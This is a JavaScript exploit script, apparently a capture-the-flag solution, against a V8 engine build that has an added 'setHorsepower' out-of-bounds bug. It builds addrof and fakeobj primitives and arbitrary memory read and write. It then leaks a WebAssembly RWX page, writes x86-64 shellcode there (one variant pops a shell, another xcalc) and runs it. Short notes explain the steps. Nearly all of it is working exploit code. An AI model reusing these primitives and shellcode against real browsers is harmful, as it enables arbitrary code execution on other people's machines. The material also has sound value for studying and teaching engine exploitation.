/*
tourpran exp 2
*/

var arr = new ArrayBuffer(8);
var f64_arr = new Float64Array(arr);
var u64_arr = new Uint32Array(arr);

function ftoi(val){
    f64_arr[0] = val;
    return BigInt(u64_arr[0]) + (BigInt(u64_arr[1])<<32n);
}

function itof(val){
    u64_arr[0] = Number(val&0xffffffffn);
    u64_arr[1] = Number(val >> 32n);
    return f64_arr[0];
}

// Get the maps of obj arr and float arr
f_arr = [1.1, 1.2, 1.3, 1.4];
obj_arr = [{abcd: 0x1337}]
f_arr.setHorsepower(100);
f_map = ftoi(f_arr[4]);
obj_map = ftoi(f_arr[13]);


function addrof(obj){
    obj_arr[0] = obj;
    f_arr[13] = itof(f_map);
    var addr = obj_arr[0];
    f_arr[13] = itof(obj_map);
    return ftoi(addr);
}

function fakeobj(addr){
    f_arr[0] = itof(addr);      // addr of new obj   
    f_arr[4] = itof(obj_map);   // map changed
    var fake = f_arr[0];            // got obj
    f_arr[4] = itof(f_map);     // make things normal
    return fake;
}

function ini_write(addr, val){
    var craf = [itof(f_map), 1.2, 1.3, 1.4];
    fake = fakeobj(addrof(craf)-0x20n);                     // create fakeobj at 
    craf[1] = itof(addr-8n);   // set the address
    fake[0] = itof(BigInt(val));                            // assign value into the addres
}

function read(addr){
    var craf = [itof(f_map), 1.2, 1.3, 1.4];
    fake = fakeobj(addrof(craf)-0x20n);                     // create fakeobj at 
    craf[1] = itof(addr-8n);   // set the address
    return ftoi(fake[0]);
}

var buf = new ArrayBuffer(8);
var b_store
function write(addr, val){
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);
    b_store = buf_addr+20n;
    ini_write(b_store, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

function write_code(addr){

    // pop xcalc
    // let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    // pop shell - added some nops(2) at the end as the string /bin/sh was not getting recongised. 
    let shellcode = [0x90909090,0x6a01fe0c,0x2448b82f,0x62696e2f,0x63617450,0x4889e76a,0x7448b801,0x01010101,0x01010150,0x48b80167,0x6d60662f,0x75794831,0x042448b8,0x2f62696e,0x2f636174,0x5031f656,0x6a115e48,0x01e6566a,0x105e4801,0xe6564889,0xe631d26a,0x3b580f05];
    var b = new ArrayBuffer(0x100); 
    let dv = new DataView(b);
    let b_stor = addrof(b)+20n;
    ini_write(b_stor, addr);

    for(let i=0; i<shellcode.length;i++){
        dv.setUint32(i*4, shellcode[i]); // my shellcode array is already in little endian. generated from exp.py
    }
}

// Main Exploit

console.log("[*] Creating the wasm instance");
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
rwx_page = read(addrof(wasm_instance) + 0x68n);

console.log(rwx_page);
console.log("[*] Writing shellcode to memory");
write_code(rwx_page);
console.log("[*] Calling xcalc/shell");
f();


/*
Notes:
- Has an OOB read and write for any array.
- Allowed to change the map of float array and object array. 
- can create addrof and fakeobj primitive.
- create wasm instance to get rwx page in memory and leak it using the wasm_instance.
- write the shellcode into the memory and call the module.

float arr 
- elements - 0x234408085121<-----
- maps - 0x2344082439f1         |
                                |
obj arr                     relative
- elements - 0x234408085151     |
- maps - 0x234408243a41 <--------
*/